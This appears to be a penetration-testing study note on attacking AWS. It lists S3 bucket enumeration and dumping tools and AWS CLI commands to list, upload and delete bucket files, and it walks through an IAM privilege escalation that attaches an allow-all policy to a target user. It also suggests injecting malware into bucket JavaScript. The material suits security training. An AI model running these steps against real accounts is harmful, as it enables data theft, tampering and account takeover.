# Cloud Compluting 

## Tools for S3 Bucket Enumeration

### lazys3

Find S3 Buckets for a specific company by Bruteforcing.

Usage:
```shell
$ ruby lazys3.rb <Company>
...
Found bucket: <Company> (403)
```

### S3Scanner

Finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. The S3 buckets that are found are output to a file. The tool also dumps or lists the contents of “open” buckets locally.

Usage:

```bash
# Standard usage
$ python3 ./s3scanner.py sites.txt

# Dump all open buckets and log both open and closed buckets in found.txt:
$ python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt

# Just log open buckets in the default output file (buckets.txt):
$ python3 ./s3scanner.py names.txt

# Save the file listings of all open buckets to a file:
$ python ./s3scanner.py --list names.txt
```


### S3 Bucket List

S3BucketList is a Firefox extension that records S3 buckets found in requests and lists them along with their permissions. Using this tool, we can determine whether an S3 bucket is public or private.

Link: https://addons.mozilla.org/en-US/firefox/addon/s3-bucket-list/


### AWSCli

The AWS command line interface (CLI) is a unified tool for managing AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.

Exploit misconfigurations in bucket implementation and breach the security mechanism to compromise data privacy. Leaving the S3 bucket session running enables you to modify files such as JavaScript or related code and inject malware into the bucket files.

Install:  
```shell
$ pip3 install awscli
```

Get the Amazon Keys at https://console.aws.amazon.com on the Upper Right there is a Drop Down menu, click there and then click on Security Credentials. Click Access keys (access key ID and secret access key) in the Your Security Credentials section. Press the Button "Create New Access Key".

Configuration:
```bash
$ aws configure 
AWS Access Key ID [None]: INSERTKEYHERE
AWS Secret Access Key [None]: INSERTSECRETKEYHERE
Default Region Name [None]: eu-west-1
Default Output Format [None]:
```

Usage:
```bash
# List directories in the certifiedhacker1 Bucket
$ aws s3 ls s3://certifiedhacker1
# Upload a file (Hack.txt) to the S3 Bucket
$ aws s3 mv Hack.txt s3://certifiedhacker1 
# Delete a file
$ aws s3 rm s3://certifiedhacker1/Hack.txt
```

## Privilege Escaltion by Exploiting Misconfigured User Policy on AWS 

A policy is an entity that, when attached to an identity or resource, defines its permissions. Customer-managed policies are standalone policies that you administer in your AWS account. You can then attach the policies to the identities (users, groups, and roles) in your AWS account. If the user policies are not configured properly, they can be exploited by attackers to gain full administrator access to the target user’s AWS account.
> Note: In this task, for demonstration purposes, we have created an IAM user account with permissions including iam:CreatePolicy, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole, and iam:ListRoles. These policies can be exploited by attackers to gain administrator-level privileges.

After doing `aws configure` in command line create a user-policy.json and paste these rules:
```json
{
    "Version":"2012-10-17",
    "Statement": [
        {
            "Effect":"Allow",
            "Action":"*",
            "Resource":"*"
        }
    ]
}
```

> Note: This is an AdministratorAccess policy that gives administrator access to the target IAM user. Ignore the $ symbols in the script.

```bash
# Upload and create the user policy on the cloud too.
$ aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
# Attach the created policy (user-policy) to the target IAM user’s account
$ aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
# View the attached user policy
$ aws iam list-attached-user-policies --user-name [Target Username]
# List all the IAM users in the AWS environment
$ aws iam list-users
```

Various commands to obtain information about the AWS environment such as the list of S3 buckets, user policies, role policies, and group policies, as well as to create a new user.

List of S3 buckets: `aws s3api list-buckets --query "Buckets.Name"`\
User Policies: `aws iam list-user-policies`\
Role Policies: `aws iam list-role-policies`\
Group policies: `aws iam list-group-policies`\
Create user: `aws iam create-user`